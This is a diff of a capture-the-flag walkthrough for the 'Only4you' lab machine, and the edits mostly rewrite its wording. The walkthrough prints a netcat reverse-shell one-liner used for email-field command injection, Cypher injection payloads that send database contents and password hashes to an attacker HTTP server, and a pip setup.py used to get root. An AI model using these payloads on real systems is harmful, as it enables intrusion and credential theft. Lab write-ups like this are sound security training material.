@@ -6,7 +6,7 @@
  
  ## Enumeration:
  
- Started with the quick rustscan & observed 2 open ports 80 & 22.
+I started with a quick rustscan and observed that there were two open ports: 80 and 22.
  
  ```
  sudo rustscan -a 10.10.11.210 -- -sC -sV -vv -oN onlyforyou_nmap
@@ -28,62 +28,61 @@
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
 
-After the port scanning I observed a domain running on port 80, i.e. : http://only4you.htb/. I added the domain to the hosts file.
+After the port scan, I discovered a domain running on port 80: http://only4you.htb/. I added this domain to the hosts file.
 
-I checked website & html source code but didn't found anything useful to get initial access.
+Next, I checked the website and its HTML source code but didn't find anything useful for gaining initial access.
 
 -----------------------------------------------------------------------------------------------------------------------------------------------------------------------
 
 ### Fuzzing:
 
-After that I scanned for the sub-directories & VHOST enumeration. In the sub-directory enumeration I didn't found anything but in the VHOST enumeration I observed a domain 'beta.only4you.htb'.
+Next, I scanned for sub-directories and performed VHOST enumeration. Although I did not find anything during the sub-directory enumeration, I observed a domain called 'beta.only4you.htb' during the VHOST enumeration.
 
 ![image](https://user-images.githubusercontent.com/87700008/234087689-bf77eafe-7c74-4c13-a16d-ba5daaf82151.png)
 
-The beta website is providing some functionality to resize & convert the images, in the home page of the website I found the source code written in python to perform reszie & conversion.
+The beta website provided functionality to resize and convert images, and I found Python source code on the homepage that was used to perform the resizing and conversion.
 
 ![image](https://user-images.githubusercontent.com/87700008/234435248-c2ce1fa5-0fff-4caa-bf36-5f53400d94b4.png)
 
-I again ran the sub-directory enumeration for the beta website & found 5 sub-directories:
+I ran the sub-directory enumeration again for the beta website and found five sub-directories.
+
 ![image](https://user-images.githubusercontent.com/87700008/234435295-e8f7400b-4f58-4c92-b8bc-ebcb36958804.png)
 
-At this point, I browsed through the beta website & checked all the fucntions manually, since there is an upload option I thought there might be some vulnerability exist in the upload fucntion.
+At this point, I manually checked all the functions on the beta website, and since there was an upload option, I thought there might be a vulnerability in the upload function.
 
-I started checking the source code & in the "**app.py**" I found this part of the '/download' function vulnerable to LFI, the code checks if the image filename contains the string '..' or starts with '../'. However, it only performs a basic check and doesn't sanitize the user input.
+I started checking the source code and found that the '/download' function in "**app.py**" was vulnerable to LFI. The code checked if the image filename contained the string '..' or started with '../', but it only performed a basic check and did not sanitize user input.
 
 ![image](https://user-images.githubusercontent.com/87700008/234435937-271b662e-83ee-4cc2-aae6-f991943217f6.png)
 
-To confirm this, I fired up my burp suite & intercepted the download request after uploading a random image file. 
-After few trial & test I finally confirmed the LFI vulnerability in the Image parameter:
+To confirm this, I intercepted the download request using Burp Suite after uploading a random image file. After a few trials and tests, I finally confirmed the LFI vulnerability in the Image parameter.
 
 ![image](https://user-images.githubusercontent.com/87700008/234436376-98147449-e97a-4714-a22f-d08c40e43a63.png)
 
-In the **passwd** file I observed 3 users apart from the root:
+I observed three users apart from root in the passwd file apart from root user:
 ```
 john
 neo4j
 dev
 ```
-As of now I am aware that the website is running on the Apache Nginx configuration, which I observed in my port scan & wappalyzer. I serched for the default nginx configuration path on google checked for the configuration on this path:
+I knew that the website was running on the Apache Nginx configuration, which I had observed during my port scan and using Wappalyzer. I searched for the default Nginx configuration path on Google and checked the configuration on this path: "/etc/nginx/sites-available/default".
 ```
 /etc/nginx/sites-available/default
 ```
 ![image](https://user-images.githubusercontent.com/87700008/234570849-14881545-8dbf-4e28-8b27-6198b5f7b3fc.png)
 
-In the response I found 2 paths for nginx config of the website:
+In the response, I found two paths for the Nginx config of the website:
 ```
 - /var/www/beta.only4you.htb/
 - /var/www/only4you.htb/
 ```
 
-I tried different parameters multiple times but wasn't able to get any positive respone to move further, then I though may be I should go with checking the source code of the "only4you.htb" domain.
-Since from the beta website I already know the source code was saved in "**app.py**" file, I tried to fetch the same file here as well.
+I tried different parameters multiple times but was not able to get any positive response to move further. Then, I thought maybe I should check the source code of the "only4you.htb" domain. Since I already knew from the beta website that the source code was saved in the "**app.py**" file, I tried to fetch the same file here as well.
 
-And, finally I got the response. But in this source code file I observed an unusual import '**from form import sendmessage**':
+Finally, I got a response. However, in this source code file, I observed an unusual import '**from form import sendmessage**':
 
 ![image](https://user-images.githubusercontent.com/87700008/234573417-4aac54b3-90bf-4387-a2c5-ad75b7f2cd1b.png)
 
-I thought this import "form" must be there in the same directory so I checked that file as well & got the source code of the file:
+I assumed that the import "form" should be located in the same directory, so I checked that file and obtained its source code:
 
 ![image](https://user-images.githubusercontent.com/87700008/234576700-b2e1fdc5-e877-4fff-97f2-395a546f2e65.png)
 
@@ -173,23 +172,22 @@ The regular expression used to validate email addresses is not very strict and c
 -----------------------------------------------------------------------------------------------------------------------------------------------------------------------
 ### Initial access:
 
-Now, I have discovered the vulnerability by going through the source code in the send message part it's time to exploit it & get the reverse shell.
-This is the request part when I was checking the send message functionality :
+After examining the source code, I discovered a vulnerability in the send message function. The next step was to exploit it and gain a reverse shell. Here's the request I used while testing the functionality:
 
 ![image](https://user-images.githubusercontent.com/87700008/234578655-95edfce7-dd90-496c-821d-11e22b099a9c.png)
 
-Since the domain variable is not properly sanatized & e-mail address is not very stict we can inject our payload in the e-mail parameter.
+Because the domain variable is not properly sanitized and the email address is not strictly validated, we can inject our payload in the email parameter.
 
-I tried multiple payloads options but I found this paylod gave the the reverse shell:
+I tried multiple payloads and finally found one that gave me a reverse shell:
 ```
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc IP Port >/tmp/f
 ```
 
-I added the payload after the e-mail address using the pipe & encoded it in URL format:
+I added the payload after the email address using the pipe character and encoded it in URL format:
 
 ![image](https://user-images.githubusercontent.com/87700008/234580735-40a623a9-5c7d-46fb-98ec-b7b8d88df9f7.png)
 
-And, finally I received the shell, with the www-data user (pwn3d🙂!):
+Finally, I received the shell with the www-data user.(pwn3d🙂!)
 
 ![image](https://user-images.githubusercontent.com/87700008/234581090-1a5947c4-398d-4839-92e1-659badd81f85.png)
 
@@ -197,14 +195,13 @@ And, finally I received the shell, with the www-data user (pwn3d🙂!):
 
 ### User access:
 
-As of now I have the access of the user 'www-data' but I don't have the user access & from this point I have to move laterally to get the user flag.
-Since I don't have password for the current user I start with checking the running processes I found few services running locally:
+Currently, I have access to the user 'www-data', but I don't have the user access that I need to move laterally and get the user flag. Since I don't have the password for the current user, I started by checking the running processes and found a few services running locally:
 
 ![image](https://user-images.githubusercontent.com/87700008/234593441-58cdd0e2-5869-469c-b964-b6a94a6ea525.png)
 
-From these running services 2 of the listening ports caught my attention, i.e. 8001 & 7474. I already observed previously that there is a 'neo4j' user exist & the port 7474 is also running locally which means this box might be vulnerable to 'neo4j' exploit.
+Out of these running services, two of the listening ports caught my attention, i.e., 8001 and 7474. As I had previously observed that a 'neo4j' user exists and the port 7474 is also running locally, I concluded that this box might be vulnerable to a 'neo4j' exploit.
 
-For the service running on port 8001, I have to perform the port forwarding to my own attacker machine. I transferred the Chisel binary & intitated port forwarding to both of the ports.
+For the service running on port 8001, I had to perform port forwarding to my own attacker machine. I transferred the Chisel binary and initiated port forwarding for both of the ports.
 
 In my attacker machine:
 ```
@@ -219,27 +216,27 @@ In the victim box:
 ![image](https://user-images.githubusercontent.com/87700008/234597676-01546cda-1a2b-43bb-b21f-a10f988d9293.png)
 ![image](https://user-images.githubusercontent.com/87700008/234597774-f0e7ef5c-bdce-465c-bf53-9b02a57ca2bc.png)
 
-After performing the port forwarding I loaded the service running on port 8001 & got a login page.
+After performing the port forwarding, I loaded the service running on port 8001 and got a login page.
 
 ![image](https://user-images.githubusercontent.com/87700008/234723074-604ea8a9-c6ff-44b4-8b22-38b169263aba.png)
 
-I tried different default credentials & finally found 'admin:admin' as a valid credentials.This is a website which is having multiple data hosted in it such as employee info, sales info, e-mails, etc.
+I tried different default credentials and finally found 'admin:admin' to be valid. This is a website with multiple data hosted on it, such as employee information, sales information, and e-mails.
 
 ![image](https://user-images.githubusercontent.com/87700008/234723577-225b8da6-381c-4294-bbce-f2a22c933e93.png)
 
-As I observed earlier there is a neo4j database running in the background & in this case when I browsed through the port 7474 service I got the neo4j console page as well. Which clearly indicates that the dashboard is running on the neo4j database.
+As I observed earlier, there is a neo4j database running in the background, and in this case, when I browsed through the port 7474 service, I got the neo4j console page as well, which clearly indicates that the dashboard is running on the neo4j database.
 
 ![image](https://user-images.githubusercontent.com/87700008/234723987-b9ef1fb0-5bfa-41ef-903d-8e6096b407ad.png)
 
 #### Injection:
 
-Since neo4j is a database this might be vulnerable to the injection as well just like a SQL DB. I started searching for the neo4j injection & found the injection methods on hacktriz website, known as [cypher injection neo4j](https://book.hacktricks.xyz/pentesting-web/sql-injection/cypher-injection-neo4j).
+Since neo4j is a database, it might be vulnerable to injection, just like an SQL DB. I started searching for neo4j injection methods and found the injection methods on the Hacktrix website, known as [cypher injection neo4j](https://book.hacktricks.xyz/pentesting-web/sql-injection/cypher-injection-neo4j).
 
-There is a search bar in the Employees section of the dashboard which probably looks vulnerable for the injection. I fired up the burp & intercepted the request to test it.
+There is a search bar in the Employees section of the dashboard that looked vulnerable to injection. I fired up Burp and intercepted the request to test it.
 
 ![image](https://user-images.githubusercontent.com/87700008/234725758-333bde8e-757a-420f-93b5-eea9346de4b0.png)
 
-I started checking with the **server version info** & passed this payload in the search parameter in URL enocded format. Also, as I am passing the http requests I also started my HTTP server.
+I began my exploration by checking the server version info. To do this, I passed a payload in URL-encoded format as a search parameter. As I was passing the HTTP requests, I also started my HTTP server. The payload I used was as follows:
 ```
 ' OR 1=1 WITH 1 as a  CALL dbms.components() YIELD name, versions, edition UNWIND versions as version LOAD CSV FROM 'http://10.0.2.4:8000/?version=' + version + '&name=' + name + '&edition=' + edition as l RETURN 0 as _0 // 
 ```
@@ -247,28 +244,24 @@ I started checking with the **server version info** & passed this payload in the
 ![image](https://user-images.githubusercontent.com/87700008/234725974-e73af889-e367-4c78-a0fe-b768e9dd6f91.png)
 ![image](https://user-images.githubusercontent.com/87700008/234726008-fde79e2c-ec03-44d3-8322-32b299277c8e.png)
 
-Getting the label info to list all existing labels.
+I obtained the label info to list all existing labels by using the following payload:
 ```
 ' OR 1=1 WITH 1 as a CALL db.labels() yield label LOAD CSV FROM 'http://IP:80/?label='+label as l RETURN 0 as _0 //
 ```
 
 ![image](https://user-images.githubusercontent.com/87700008/234726758-9e2d0adb-a45d-4b2c-a8ef-92b04e2c2f1e.png)
 
-Found 2 tables **user** & **employee**.
-
-Now Finally it's time to retriee info from the tables :
+I then discovered two tables, namely, '**user**' and '**employee**'. It was now time to retrieve information from these tables. I used the following payload for this:
 ```
 ' OR 1=1 WITH 1 as a MATCH (f:user) UNWIND keys(f) as p LOAD CSV FROM 'http://10.0.2.4:8000/?' + p +'='+toString(f[p]) as l RETURN 0 as _0 //
 ```
 ![image](https://user-images.githubusercontent.com/87700008/234727096-5cee1c9c-bf30-4924-8dc0-03ae315c7441.png)
 
-In the response I got the admin & john, password hash. Now, let's cracl the password of John.
-
-In few seconds I cracked the password using John the Ripper.
+In the response, I received the admin and John's password hash. Next, I used John the Ripper to crack John's password. It took me only a few seconds to do this, and I was able to log in to John's account via SSH using the cracked password.
 
 ![image](https://user-images.githubusercontent.com/87700008/234728055-1ed4f9b5-be08-4e70-a03a-87d7b8092c94.png)
 
-And, finally I logged in into the John account via SSH using the cracked password & got the user flag. (pwn3d!🙂)
+And, finally I retrieved the user flag. (pwn3d!🙂)
 
 ![image](https://user-images.githubusercontent.com/87700008/234728218-8d3baefb-294d-494b-a994-22d27a46c887.png)
 
@@ -276,23 +269,23 @@ And, finally I logged in into the John account via SSH using the cracked passwor
 
 ## Privilege Escalation:
 
-After getting access of John's account I checked for the sudo privileges & found this :
+After gaining access to John's account, I checked for sudo privileges and found the following:
 
 ![image](https://user-images.githubusercontent.com/87700008/234729321-b7ae0af1-b0e6-4658-83e2-c584b00c30ac.png)
 
-I forwarded the traffic of the port 3000 to my attack machine & loaded it in the browser. It's a git server with just 1 test repository.
+I forwarded the traffic of port 3000 to my attack machine and loaded the Git server in the browser. It contained only one 'test' repository.
 
 ![image](https://user-images.githubusercontent.com/87700008/234729484-f99d6703-cb8d-4efa-9003-29f7309e8024.png)
 
-Now, since I can only run pip3 command & I have access to the Git repository, there may be some some kind of vulnerability exist in the pip download. Also, the sudo privilege is giving access to download anything from Git as it's ending with '*'.
+As I only had permission to run the **pip3** command and access to the Git repository, I suspected that there might be a vulnerability in the pip download. Moreover, the **sudo** privilege allowed me to download anything from Git as long as the URL ends with '*':
 ```
 User john may run the following commands on only4you:
     (root) NOPASSWD: /usr/bin/pip3 download http\://127.0.0.1\:3000/*.tar.gz
 ```
 
-I then started checking for the possible command execution methond to gain root shell & ended up landing on this blog : [Malicious Python Packages and Code Execution via pip download](https://embracethered.com/blog/posts/2022/python-package-manager-install-and-download-vulnerability/)
+I began searching for a possible command execution method to gain root shell access and found this blog post: [Malicious Python Packages and Code Execution via pip download](https://embracethered.com/blog/posts/2022/python-package-manager-install-and-download-vulnerability/).
 
-I took setup.py source code which is necesaary to build python pip package & made some changes in it to get root shell, so the final code for setup.py is :
+I used the source code for **setup.py**, which is required to build a Python pip package, and made some changes to obtain root shell access. The final code for **setup.py** was as follows:
 ```
 from setuptools import setup, find_packages
 from setuptools.command.install import install
@@ -325,22 +318,22 @@ setup(
 )
 ```
 
-After the setup.py file is ready I ran this command to create the package:
+Once the setup.py file was ready, I used the following command to create the package:
 ```
 python3 setup.py sdist
 ```
 ![image](https://user-images.githubusercontent.com/87700008/234968459-90eacdbe-2be5-4ac2-931a-5b1ce1b71195.png)
 
-Next action is to create a new repo & upload my pacakge on that repo. I created a new repo with the name 'kill3r' & uploaded my pacakage file in that repo which was under /dist folder:
+My next action was to create a new repository and upload my package to it. I created a new repository named 'kill3r' and uploaded my package file to the '/dist' folder:
 
 ![image](https://user-images.githubusercontent.com/87700008/234968862-319128c2-92f8-4dc4-8ba8-dced56045454.png)
 
-After the successfull upload I just download the sudo command, which was also executed after the download:
+After successfully uploading the package, I downloaded the pip package with sudo command, which was also executed after the download:
 ```
 sudo /usr/bin/pip3 download http://127.0.0.1:3000/john/kill3r/raw/master/kill3r-0.0.1.tar.gz
 ```
 
-Finally after the download I got access for the root bash. (pwn3d!🙂)
+Finally, after the download, I gained access to the root bash.(pwn3d!🙂)
 
 ![image](https://user-images.githubusercontent.com/87700008/234969519-eee311b5-9a32-434e-85ff-b04c4c09da39.png)
 
